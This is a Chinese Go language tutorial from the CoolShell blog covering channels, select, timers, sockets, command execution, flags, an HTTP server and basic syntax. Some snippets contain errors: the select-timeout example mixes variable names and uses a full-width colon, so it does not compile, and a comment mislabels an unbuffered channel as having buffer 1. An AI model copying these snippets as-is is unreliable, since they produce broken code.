<p>Channal是什么？Channal就是用来通信的，就像Unix下的管道一样，在Go中是这样使用Channel的。</p>
<p>下面的程序演示了一个goroutine和主程序通信的例程。这个程序足够简单了。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="7,10">
package main

import &quot;fmt&quot;

func main() {
    //创建一个string类型的channel
    channel := make(chan string)

    //创建一个goroutine向channel里发一个字符串
    go func() { channel &lt;- &quot;hello&quot; }()

    msg := &lt;- channel
    fmt.Println(msg)
}[</pre>
<p><strong>指定channel的buffer</strong></p>
<p>指定buffer的大小很简单，看下面的程序：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="5">package main
import &quot;fmt&quot;

func main() {
    channel := make(chan string, 2)

    go func() {
        channel &lt;- &quot;hello&quot;
        channel &lt;- &quot;World&quot;
    }()

    msg1 := &lt;-channel
    msg2 := &lt;-channel
    fmt.Println(msg1, msg2)
}</pre>
<p><strong>Channel的阻塞</strong></p>
<p>注意，channel默认上是阻塞的，也就是说，如果Channel满了，就阻塞写，如果Channel空了，就阻塞读。于是，我们就可以使用这种特性来同步我们的发送和接收端。</p>
<p>下面这个例程说明了这一点，代码有点乱，不过我觉得不难理解。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

import &quot;fmt&quot;
import &quot;time&quot;

func main() {

    channel := make(chan string) //注意: buffer为1

    go func() {
        channel &lt;- &quot;hello&quot;
        fmt.Println(&quot;write \&quot;hello\&quot; done!&quot;)

        channel &lt;- &quot;World&quot; //Reader在Sleep，这里在阻塞
        fmt.Println(&quot;write \&quot;World\&quot; done!&quot;)

        fmt.Println(&quot;Write go sleep...&quot;)
        time.Sleep(3*time.Second)
        channel &lt;- &quot;channel&quot;
        fmt.Println(&quot;write \&quot;channel\&quot; done!&quot;)
    }()

    time.Sleep(2*time.Second)
    fmt.Println(&quot;Reader Wake up...&quot;)

    msg := &lt;-channel
    fmt.Println(&quot;Reader: &quot;, msg)

    msg = &lt;-channel
    fmt.Println(&quot;Reader: &quot;, msg)

    msg = &lt;-channel //Writer在Sleep，这里在阻塞
    fmt.Println(&quot;Reader: &quot;, msg)
}</pre>
<p>上面的代码输出的结果如下：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">
Reader Wake up...
Reader:  hello
write &quot;hello&quot; done!
write &quot;World&quot; done!
Write go sleep...
Reader:  World
write &quot;channel&quot; done!
Reader:  channel
</pre>
<p><strong>Channel阻塞的这个特性还有一个好处是，可以让我们的goroutine在运行的一开始就阻塞在从某个channel领任务，这样就可以作成一个类似于线程池一样的东西。关于这个程序我就不写了。我相信你可以自己实现的。</strong></p>
<p><strong>多个Channel的select</strong></p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main
import &quot;time&quot;
import &quot;fmt&quot;

func main() {
    //创建两个channel - c1 c2
    c1 := make(chan string)
    c2 := make(chan string)

    //创建两个goruntine来分别向这两个channel发送数据
    go func() {
        time.Sleep(time.Second * 1)
        c1 &lt;- &quot;Hello&quot;
    }()
    go func() {
        time.Sleep(time.Second * 1)
        c2 &lt;- &quot;World&quot;
    }()

    //使用select来侦听两个channel
    for i := 0; i &lt; 2; i++ {
        select {
        case msg1 := &lt;-c1:
            fmt.Println(&quot;received&quot;, msg1)
        case msg2 := &lt;-c2:
            fmt.Println(&quot;received&quot;, msg2)
        }
    }
}</pre>
<p>注意：上面的select是阻塞的，所以，才搞出ugly的for i &lt;2这种东西<strong>。<br />
</strong></p>
<p><strong>Channel select阻塞的Timeout</strong></p>
<p>解决上述那个for循环的问题，一般有两种方法：一种是阻塞但有timeout，一种是无阻塞。我们来看看如果给select设置上timeout的。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="8">
    for {
        timeout_cnt := 0
        select {
        case msg1 := &lt;-c1:
            fmt.Println(&quot;msg1 received&quot;, msg1)
        case msg2 := &lt;-c2:
            fmt.Println(&quot;msg2 received&quot;, msg2)
        case  &lt;-time.After(time.Second * 30)：
            fmt.Println(&quot;Time Out&quot;)
            timout_cnt++
        }
        if time_cnt &gt; 3 {
            break
        }
    }
</pre>
<p>上面代码中高亮的代码主要是用来让select返回的，注意 case中的time.After事件。</p>
<p><strong>Channel的无阻塞</strong></p>
<p>好，我们再来看看无阻塞的channel，其实也很简单，就是在select中加入default，如下所示：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="8">
    for {
        select {
        case msg1 := &lt;-c1:
            fmt.Println(&quot;received&quot;, msg1)
        case msg2 := &lt;-c2:
            fmt.Println(&quot;received&quot;, msg2)
        default: //default会导致无阻塞
            fmt.Println(&quot;nothing received!&quot;)
            time.Sleep(time.Second)
        }
    }
</pre>
<p><strong>Channel的关闭</strong></p>
<p>关闭Channel可以通知对方内容发送完了，不用再等了。参看下面的例程：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="19,27">package main

import &quot;fmt&quot;
import &quot;time&quot;
import &quot;math/rand&quot;

func main() {

    channel := make(chan string)
    rand.Seed(time.Now().Unix())

    //向channel发送随机个数的message
    go func () {
        cnt := rand.Intn(10)
        fmt.Println(&quot;message cnt :&quot;, cnt)
        for i:=0; i&lt;cnt; i++{
            channel &lt;- fmt.Sprintf(&quot;message-%2d&quot;, i)
        }
        close(channel) //关闭Channel
    }()

    var more bool = true
    var msg string
    for more {
        select{
        //channel会返回两个值，一个是内容，一个是还有没有内容
        case msg, more = &lt;- channel:
            if more {
                fmt.Println(msg)
            }else{
                fmt.Println(&quot;channel closed!&quot;)
            }
        }
    }
}</pre>
<h4>定时器</h4>
<p>Go语言中可以使用time.NewTimer或time.NewTicker来设置一个定时器，这个定时器会绑定在你的当前channel中，通过channel的阻塞通知机器来通知你的程序。</p>
<p>下面是一个timer的示例。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="9">package main

import &quot;time&quot;
import &quot;fmt&quot;

func main() {
    timer := time.NewTimer(2*time.Second)

    &lt;- timer.C
    fmt.Println(&quot;timer expired!&quot;)
}</pre>
<p>上面的例程看起来像一个Sleep，是的，不过Timer是可以Stop的。你需要注意Timer只通知一次。如果你要像C中的Timer能持续通知的话，你需要使用Ticker。下面是Ticker的例程：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="9">package main

import &quot;time&quot;
import &quot;fmt&quot;

func main() {
    ticker := time.NewTicker(time.Second)

    for t := range ticker.C {
        fmt.Println(&quot;Tick at&quot;, t)
    }
}</pre>
<p>上面的这个ticker会让你程序进入死循环，我们应该放其放在一个goroutine中。下面这个程序结合了timer和ticker</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

import &quot;time&quot;
import &quot;fmt&quot;

func main() {

    ticker := time.NewTicker(time.Second)

    go func () {
        for t := range ticker.C {
            fmt.Println(t)
        }
    }()

    //设置一个timer，10钞后停掉ticker
    timer := time.NewTimer(10*time.Second)
    &lt;- timer.C

    ticker.Stop()
    fmt.Println(&quot;timer expired!&quot;)
}</pre>
<h4>Socket编程</h4>
<p>下面是我尝试的一个Echo Server的Socket代码，感觉还是挺简单的。</p>
<p><strong>Server端</strong></p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="12,19,24,33,36"> 
package main

import (
    &quot;net&quot;
    &quot;fmt&quot;
    &quot;io&quot;
)

const RECV_BUF_LEN = 1024

func main() {
    listener, err := net.Listen(&quot;tcp&quot;, &quot;0.0.0.0:6666&quot;)//侦听在6666端口
    if err != nil {
        panic(&quot;error listening:&quot;+err.Error())
    }
    fmt.Println(&quot;Starting the server&quot;)

    for {
        conn, err := listener.Accept() //接受连接
        if err != nil {
            panic(&quot;Error accept:&quot;+err.Error())
        }
        fmt.Println(&quot;Accepted the Connection :&quot;, conn.RemoteAddr())
        go EchoServer(conn)
    }
}

func EchoServer(conn net.Conn) {
    buf := make([]byte, RECV_BUF_LEN)
    defer conn.Close()

    for {
        n, err := conn.Read(buf);
        switch err {
            case nil:
                conn.Write( buf[0:n] )
            case io.EOF:
                fmt.Printf(&quot;Warning: End of data: %s \n&quot;, err);
                return
            default:
                fmt.Printf(&quot;Error: Reading data : %s \n&quot;, err);
                return
        }
     }
}
</pre>
<p><strong>Client端</strong></p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="12,23,31">
package main

import (
    &quot;fmt&quot;
    &quot;time&quot;
    &quot;net&quot;
)

const RECV_BUF_LEN = 1024

func main() {
    conn,err := net.Dial(&quot;tcp&quot;, &quot;127.0.0.1:6666&quot;)
    if err != nil {
        panic(err.Error())
    }
    defer conn.Close()

    buf := make([]byte, RECV_BUF_LEN)

    for i := 0; i &lt; 5; i++ {
        //准备要发送的字符串
        msg := fmt.Sprintf(&quot;Hello World, %03d&quot;, i)
        n, err := conn.Write([]byte(msg))
        if err != nil {
            println(&quot;Write Buffer Error:&quot;, err.Error())
            break
        }
        fmt.Println(msg)

        //从服务器端收字符串
        n, err = conn.Read(buf)
        if err !=nil {
            println(&quot;Read Buffer Error:&quot;, err.Error())
            break
        }
        fmt.Println(string(buf[0:n]))

        //等一秒钟
        time.Sleep(time.Second)
    }
}
</pre>
<h4>系统调用</h4>
<p>Go语言那么C，所以，一定会有一些系统调用。Go语言主要是通过两个包完成的。一个是<a href="http://golang.org/pkg/os/" target="_blank" rel="noopener noreferrer">os包</a>，一个是<a href="http://golang.org/pkg/syscall/" target="_blank" rel="noopener noreferrer">syscall包</a>。（注意，链接被墙）</p>
<p>这两个包里提供都是Unix-Like的系统调用，</p>
<ul>
<li>syscall里提供了什么Chroot/Chmod/Chmod/Chdir&#8230;，Getenv/Getgid/Getpid/Getgroups/Getpid/Getppid&#8230;，还有很多如Inotify/Ptrace/Epoll/Socket/&#8230;的系统调用。</li>
</ul>
<ul>
<li>os包里提供的东西不多，主要是一个跨平台的调用。它有三个子包，Exec（运行别的命令）, Signal（捕捉信号）和User（通过uid查name之类的）</li>
</ul>
<p>syscall包的东西我不举例了，大家可以看看《Unix高级环境编程》一书。</p>
<p>os里的取几个例：</p>
<p><strong>环境变量</strong></p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

import &quot;os&quot;
import &quot;strings&quot;


func main() {
    os.Setenv(&quot;WEB&quot;, &quot;https://coolshell.cn&quot;) //设置环境变量
    println(os.Getenv(&quot;WEB&quot;)) //读出来

    for _, env := range os.Environ() { //穷举环境变量
        e := strings.Split(env, &quot;=&quot;)
        println(e[0], &quot;=&quot;, e[1])
    }
}
</pre>
<h4>执行命令行</h4>
<p>下面是一个比较简单的示例</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
package main
import &quot;os/exec&quot;
import &quot;fmt&quot;
func main() {
    cmd := exec.Command(&quot;ping&quot;, &quot;127.0.0.1&quot;)
    out, err := cmd.Output()
    if err!=nil {
        println(&quot;Command Error!&quot;, err.Error())
        return
    }
    fmt.Println(string(out))
}</pre>
<p>正规一点的用来处理标准输入和输出的示例如下：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

import (
    &quot;strings&quot;
    &quot;bytes&quot;
    &quot;fmt&quot;
    &quot;log&quot;
    &quot;os/exec&quot;
)

func main() {
    cmd := exec.Command(&quot;tr&quot;, &quot;a-z&quot;, &quot;A-Z&quot;)
    cmd.Stdin = strings.NewReader(&quot;some input&quot;)
    var out bytes.Buffer
    cmd.Stdout = &amp;out
    err := cmd.Run()
    if err != nil {
        log.Fatal(err)
    }
    fmt.Printf(&quot;in all caps: %q\n&quot;, out.String())
}</pre>
<h4>命令行参数</h4>
<p>Go语言中处理命令行参数很简单：(使用os的Args就可以了)</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="2">func main() {
    args := os.Args
    fmt.Println(args) //带执行文件的
    fmt.Println(args[1:]) //不带执行文件的
}</pre>
<p>在Windows下，如果运行结果如下：</p>
<p><code>C:\Projects\Go>go run args.go aaa bbb ccc ddd<br />
[C:\Users\haoel\AppData\Local\Temp\go-build742679827\command-line-arguments&#95;<br />
obj\a.out.exe aaa bbb ccc ddd]<br />
[aaa bbb ccc ddd]</code></p>
<p>那么，如果我们要搞出一些像 mysql -uRoot -hLocalhost -pPwd 或是像 cc -O3 -Wall -o a a.c 这样的命令行参数我们怎么办？Go提供了一个package叫flag可以容易地做到这一点</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang" data-enlighter-highlight="13">
package main
import &quot;flag&quot;
import &quot;fmt&quot;

func main() {

    //第一个参数是“参数名”，第二个是“默认值”，第三个是“说明”。返回的是指针
    host := flag.String(&quot;host&quot;, &quot;coolshell.cn&quot;, &quot;a host name &quot;)
    port := flag.Int(&quot;port&quot;, 80, &quot;a port number&quot;)
    debug := flag.Bool(&quot;d&quot;, false, &quot;enable/disable debug mode&quot;)

    //正式开始Parse命令行参数
    flag.Parse()

    fmt.Println(&quot;host:&quot;, *host)
    fmt.Println(&quot;port:&quot;, *port)
    fmt.Println(&quot;debug:&quot;, *debug)
}</pre>
<p>执行起来会是这个样子：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">
#如果没有指定参数名，则使用默认值
$ go run flagtest.go
host: coolshell.cn
port: 80
debug: false

#指定了参数名后的情况
$ go run flagtest.go -host=localhost -port=22 -d
host: localhost
port: 22
debug: true

#用法出错了（如：使用了不支持的参数，参数没有=）
$ go build flagtest.go
$ ./flagtest -debug -host localhost -port=22
flag provided but not defined: -debug
Usage of flagtest:
  -d=false: enable/disable debug mode
  -host=&quot;coolshell.cn&quot;: a host name
  -port=80: a port number
exit status 2
</pre>
<p>感觉还是挺不错的吧。</p>
<h4>一个简单的HTTP Server</h4>
<p>代码胜过千言万语。呵呵。这个小程序让我又找回以前用C写CGI的时光了。（Go的官方文档是《<strong><a href="http://golang.org/doc/articles/wiki/" target="_blank" rel="noopener noreferrer">Writing Web Applications</a></strong>》）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">package main

import (
    &quot;fmt&quot;
    &quot;net/http&quot;
    &quot;io/ioutil&quot;
    &quot;path/filepath&quot;
)

const http_root = &quot;/home/haoel/coolshell.cn/&quot;

func main() {
    http.HandleFunc(&quot;/&quot;, rootHandler)
    http.HandleFunc(&quot;/view/&quot;, viewHandler)
    http.HandleFunc(&quot;/html/&quot;, htmlHandler)

    http.ListenAndServe(&quot;:8080&quot;, nil)
}

//读取一些HTTP的头
func rootHandler(w http.ResponseWriter, r *http.Request) {
    fmt.Fprintf(w, &quot;rootHandler: %s\n&quot;, r.URL.Path)
    fmt.Fprintf(w, &quot;URL: %s\n&quot;, r.URL)
    fmt.Fprintf(w, &quot;Method: %s\n&quot;, r.Method)
    fmt.Fprintf(w, &quot;RequestURI: %s\n&quot;, r.RequestURI )
    fmt.Fprintf(w, &quot;Proto: %s\n&quot;, r.Proto)
    fmt.Fprintf(w, &quot;HOST: %s\n&quot;, r.Host) 
}

//特别的URL处理
func viewHandler(w http.ResponseWriter, r *http.Request) {
    fmt.Fprintf(w, &quot;viewHandler: %s&quot;, r.URL.Path)
}

//一个静态网页的服务示例。（在http_root的html目录下）
func htmlHandler(w http.ResponseWriter, r *http.Request) {
    fmt.Printf(&quot;htmlHandler: %s\n&quot;, r.URL.Path)
    
    filename := http_root + r.URL.Path
    fileext := filepath.Ext(filename)

    content, err := ioutil.ReadFile(filename)
    if err != nil {
        fmt.Printf(&quot;   404 Not Found!\n&quot;)
        w.WriteHeader(http.StatusNotFound)
        return
    }
    
    var contype string
    switch fileext {
        case &quot;.html&quot;, &quot;htm&quot;:
            contype = &quot;text/html&quot;
        case &quot;.css&quot;:
            contype = &quot;text/css&quot;
        case &quot;.js&quot;:
            contype = &quot;application/javascript&quot;
        case &quot;.png&quot;:
            contype = &quot;image/png&quot;
        case &quot;.jpg&quot;, &quot;.jpeg&quot;:
            contype = &quot;image/jpeg&quot;
        case &quot;.gif&quot;:
            contype = &quot;image/gif&quot;
        default: 
            contype = &quot;text/plain&quot;
    }
    fmt.Printf(&quot;ext %s, ct = %s\n&quot;, fileext, contype)
    
    w.Header().Set(&quot;Content-Type&quot;, contype)
    fmt.Fprintf(w, &quot;%s&quot;, content)
    
}</pre>
<p>Go的功能库有很多，大家自己慢慢看吧。<strong>我再吐个槽——Go的文档真不好读。例子太少了</strong>。</p>
<p>先说这么多吧。这是我周末两天学Go语言学到的东西，写得太仓促了，而且还有一些东西理解不到位，还大家请指正！</p>
<p>（全文完）<!--



<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>





<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>

 

--></p>
<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>

<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/21615.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2021/09/go-generics-150x150.png" alt="Go编程模式 ： 泛型编程" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21615.html" class="wp_rp_title">Go编程模式 ： 泛型编程</a></li><li ><a href="https://coolshell.cn/articles/21263.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.k8s-150x150.png" alt="Go 编程模式：k8s Visitor 模式" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21263.html" class="wp_rp_title">Go 编程模式：k8s Visitor 模式</a></li><li ><a href="https://coolshell.cn/articles/21228.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.line_.-150x150.png" alt="Go编程模式：Pipeline" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21228.html" class="wp_rp_title">Go编程模式：Pipeline</a></li><li ><a href="https://coolshell.cn/articles/21214.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.pair_-150x150.png" alt="Go编程模式：委托和反转控制" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21214.html" class="wp_rp_title">Go编程模式：委托和反转控制</a></li><li ><a href="https://coolshell.cn/articles/21179.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.generate-150x150.png" alt="Go 编程模式：Go Generation" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21179.html" class="wp_rp_title">Go 编程模式：Go Generation</a></li><li ><a href="https://coolshell.cn/articles/21164.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/12/go.map_.reduce-150x150.png" alt="Go编程模式：Map-Reduce" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21164.html" class="wp_rp_title">Go编程模式：Map-Reduce</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/8489.html">Go 语言简介（下）— 特性</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
					
					<wfw:commentRss>https://coolshell.cn/articles/8489.html/feed</wfw:commentRss>
			<slash:comments>95</slash:comments>
		
		
			</item>
		<item>
		<title>Go 语言简介（上）— 语法</title>
		<link>https://coolshell.cn/articles/8460.html</link>
					<comments>https://coolshell.cn/articles/8460.html#comments</comments>
		
		<dc:creator><![CDATA[陈皓]]></dc:creator>
		<pubDate>Tue, 06 Nov 2012 00:27:48 +0000</pubDate>
				<category><![CDATA[Go 语言]]></category>
		<category><![CDATA[程序设计]]></category>
		<category><![CDATA[编程语言]]></category>
		<category><![CDATA[Go]]></category>
		<category><![CDATA[golang]]></category>
		<guid isPermaLink="false">http://coolshell.cn/?p=8460</guid>

					<description><![CDATA[<p>周末天气不好，只能宅在家里，于是就顺便看了一下Go语言，觉得比较有意思，所以写篇文章介绍一下。我想写一篇你可以在乘坐地铁或公交车上下班时就可以初步了解一门语言的...</p>
<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/8460.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
The post <a href="https://coolshell.cn/articles/8460.html">Go 语言简介（上）— 语法</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
     crossorigin="anonymous"></script>周末天气不好，只能宅在家里，于是就顺便看了一下Go语言，觉得比较有意思，所以写篇文章介绍一下。<strong>我想写一篇你可以在乘坐地铁或公交车上下班时就可以初步了解一门语言的文章</strong>。所以，下面的文章主要是以代码和注释为主。只需要你对C语言，Unix，Python有一点基础，我相信你会在30分钟左右读完并对Go语言有一些初步了解的。</p>
<p><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-8485" title="go" src="https://coolshell.cn/wp-content/uploads/2012/11/go2.jpg" alt="" width="435" height="255" srcset="https://coolshell.cn/wp-content/uploads/2012/11/go2.jpg 435w, https://coolshell.cn/wp-content/uploads/2012/11/go2-300x176.jpg 300w" sizes="(max-width: 435px) 100vw, 435px" /></p>
<h4>Hello World</h4>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
//文件名：hello.go
package main //声明本文件的package名

import &quot;fmt&quot; //import语言的fmt库——用于输出

func main() {
    fmt.Println(&quot;hello world&quot;)
}</pre>
<p><span id="more-8460"></span></p>
<h4>运行</h4>
<p>你可以有两种运行方式，</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">
#解释执行（实际是编译成a.out再执行）
$go run hello.go
hello world

#编译执行
$go build hello.go

$ls
hello hello.go

$./hello
hello world</pre>
<h4>自己的package</h4>
<p>你可以使用GOPATH环境变量，或是使用相对路径来import你自己的package。</p>
<p>Go的规约是这样的：</p>
<p style="padding-left: 30px;">1）<strong>在import中，你可以使用相对路径，如 ./或 ../ 来引用你的package</strong></p>
<p style="padding-left: 30px;">2）<strong>如果没有使用相对路径，那么，go会去找$GOPATH/src/目录。</strong></p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
//使用相对路径
import &quot;./haoel&quot;  //import当前目录里haoel子目录里的所有的go文件
</pre>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
//使用GOPATH路径
import &quot;haoel&quot;  //import 环境变量 $GOPATH/src/haoel子目录里的所有的go文件
</pre>
<h4>fmt输出格式</h4>
<p>fmt包和libc里的那堆使用printf， scanf，fprintf，fscanf 很相似。下面的东西对于C程序员不会陌生。</p>
<p>注意：Println不支持，Printf才支持%式的输出：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
package main

import &quot;fmt&quot;
import &quot;math&quot;

func main() {
    fmt.Println(&quot;hello world&quot;)

    fmt.Printf(&quot;%t\n&quot;, 1==2)
    fmt.Printf(&quot;二进制：%b\n&quot;, 255)
    fmt.Printf(&quot;八进制：%o\n&quot;, 255)
    fmt.Printf(&quot;十六进制：%X\n&quot;, 255)
    fmt.Printf(&quot;十进制：%d\n&quot;, 255)
    fmt.Printf(&quot;浮点数：%f\n&quot;, math.Pi)
    fmt.Printf(&quot;字符串：%s\n&quot;, &quot;hello world&quot;)
}</pre>
<p>当然，也可以使用如\n\t\r这样的和C语言一样的控制字符</p>
<h4>变量和常量</h4>
<p>变量的声明很像 javascript，使用 var关键字。注意：<strong>go是静态类型的语言</strong>，下面是代码：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
//声明初始化一个变量
var  x int = 100
var str string = &quot;hello world&quot;&lt;/pre&gt;
//声明初始化多个变量
var  i, j, k int = 1, 2, 3

//不用指明类型，通过初始化值来推导
var b = true //bool型
</pre>
<p>还有一种定义变量的方式（这让我想到了Pascal语言，但完全不一样）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
x := 100 //等价于 var x int = 100;
</pre>
<p>常量很简单，使用const关键字：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
const s string = &quot;hello world&quot;
const pi float32 = 3.1415926
</pre>
<h4>数组</h4>
<p>直接看代码（注意其中的for语句，和C很相似吧，就是没有括号了）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
func main() {
    var a [5]int
    fmt.Println(&quot;array a:&quot;, a)

    a[1] = 10
    a[3] = 30
    fmt.Println(&quot;assign:&quot;, a)

    fmt.Println(&quot;len:&quot;, len(a))

    b := [5]int{1, 2, 3, 4, 5}
    fmt.Println(&quot;init:&quot;, b)

    var c [2][3]int
    for i := 0; i &lt; 2; i++ {
        for j := 0; j &lt; 3; j++ {
            c[i][j] = i + j
        }
    }
    fmt.Println(&quot;2d: &quot;, c)
}
</pre>
<p>运行结果：</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">

array a: [0 0 0 0 0]
assign: [0 10 0 30 0]
len: 5
init: [1 2 3 4 5]
2d:  [[0 1 2] [1 2 3]]

</pre>
<h4>数组的切片操作</h4>
<p>这个很Python了。</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">

a := [5]int{1, 2, 3, 4, 5}

b := a[2:4] // a[2] 和 a[3]，但不包括a[4]
fmt.Println(b)

b = a[:4] // 从 a[0]到a[4]，但不包括a[4]
fmt.Println(b)

b = a[2:] // 从 a[2]到a[4]，且包括a[2]
fmt.Println(b)

</pre>
<p><strong>但是，我们要记住，Golang的切片是共享内存的，也就是说，没有数据的复制，只是记录从哪切到哪的信息。</strong></p>
<h4>分支循环语句</h4>
<p><strong>if语句</strong></p>
<p>注意：if 语句没有圆括号，而必需要有花括号</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
//if 语句
if x % 2 == 0 {
    //...
}
//if - else
if x % 2 == 0 {
    //偶数...
} else {
    //奇数...
}

//多分支
if num &lt; 0 {
    //负数
} else if num == 0 {
    //零
} else {
    //正数
}
</pre>
<p><strong>switch 语句</strong></p>
<p>注意：switch语句没有break，还可以使用逗号case多个值</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
switch i {
    case 1:
        fmt.Println(&quot;one&quot;)
    case 2:
        fmt.Println(&quot;two&quot;)
    case 3:
        fmt.Println(&quot;three&quot;)
    case 4,5,6:
        fmt.Println(&quot;four, five, six&quot;)
    default:
        fmt.Println(&quot;invalid value!&quot;)
}
</pre>
<p><strong>for 语句</strong></p>
<p>前面你已见过了，下面再来看看for的三种形式：（注意：Go语言中没有while）</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
//经典的for语句 init; condition; post
for i := 0; i&lt;10; i++{
     fmt.Println(i)
}

//精简的for语句 condition
i := 1
for i&lt;10 {
    fmt.Println(i)
    i++
}

//死循环的for语句 相当于for(;;)
i :=1
for {
    if i&gt;10 {
        break
    }
    i++
}
</pre>
<h4>关于分号</h4>
<p>从上面的代码我们可以看到代码里没有分号。其实，<strong>和C一样，Go的正式的语法使用分号来终止语句。和C不同的是，这些分号由词法分析器在扫描源代码过程中使用简单的规则自动插入分号，因此输入源代码多数时候就不需要分号了</strong>。</p>
<p>规则是这样的：如果在一个新行前方的最后一个标记是一个标识符（包括像<code>int</code>和<code>float64</code>这样的单词）、一个基本的如数值这样的文字、或以下标记中的一个时，会自动插入分号：</p>
<pre>break continue fallthrough return ++ -- ) }</pre>
<p>通常Go程序仅在<code>for</code>循环语句中使用分号，以此来分开初始化器、条件和增量单元。如果你在一行中写多个语句，也需要用分号分开。</p>
<p><strong>注意</strong>：<strong>无论任何时候，你都不应该将一个控制结构（(<code>if</code>、<code>for</code>、<code>switch</code>或<code>select</code>）的左大括号放在下一行。如果这样做，将会在大括号的前方插入一个分号，这可能导致出现不想要的结果</strong>。</p>
<h4>map</h4>
<p>map在别的语言里可能叫哈希表或叫dict，下面是和map的相关操作的代码，代码很容易懂</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">
func main(){
    m := make(map[string]int) //使用make创建一个空的map

    m[&quot;one&quot;] = 1
    m[&quot;two&quot;] = 2
    m[&quot;three&quot;] = 3

    fmt.Println(m) //输出 map[three:3 two:2 one:1] (顺序在运行时可能不一样)
    fmt.Println(len(m)) //输出 3

    v := m[&quot;two&quot;] //从map里取值
    fmt.Println(v) // 输出 2

    delete(m, &quot;two&quot;)
    fmt.Println(m) //输出 map[three:3 one:1]

    m1 := map[string]int{&quot;one&quot;: 1, &quot;two&quot;: 2, &quot;three&quot;: 3}
    fmt.Println(m1) //输出 map[two:2 three:3 one:1] (顺序在运行时可能不一样)

    for key, val := range m1{
        fmt.Printf(&quot;%s =&gt; %d \n&quot;, key, val)
        /*输出：(顺序在运行时可能不一样)
            three =&gt; 3
            one =&gt; 1
            two =&gt; 2*/
    }
}
</pre>
<h4>指针</h4>
<p>Go语言一样有指针，看代码</p>
<pre class="EnlighterJSRAW" data-enlighter-language="golang">

var i int = 1
var pInt *int = &amp;i
//输出：i=1     pInt=0xf8400371b0       *pInt=1
fmt.Printf(&quot;i=%d\tpInt=%p\t*pInt=%d\n&quot;, i, pInt, *pInt)

*pInt = 2
//输出：i=2     pInt=0xf8400371b0       *pInt=2
fmt.Printf(&quot;i=%d\tpInt=%p\t*pInt=%d\n&quot;, i, pInt, *pInt)

i = 3
//输出：i=3     pInt=0xf8400371b0       *pInt=3
fmt.Printf(&quot;i=%d\tpInt=%p\t*pInt=%d\n&quot;, i, pInt, *pInt)

</pre>
<p>Go具有两个分配内存的机制，分别是内建的函数new和make。他们所做的事不同，所应用到的类型也不同，这可能引起混淆，但规则却很简单。</p>
<h4><strong>内存分配 </strong></h4>
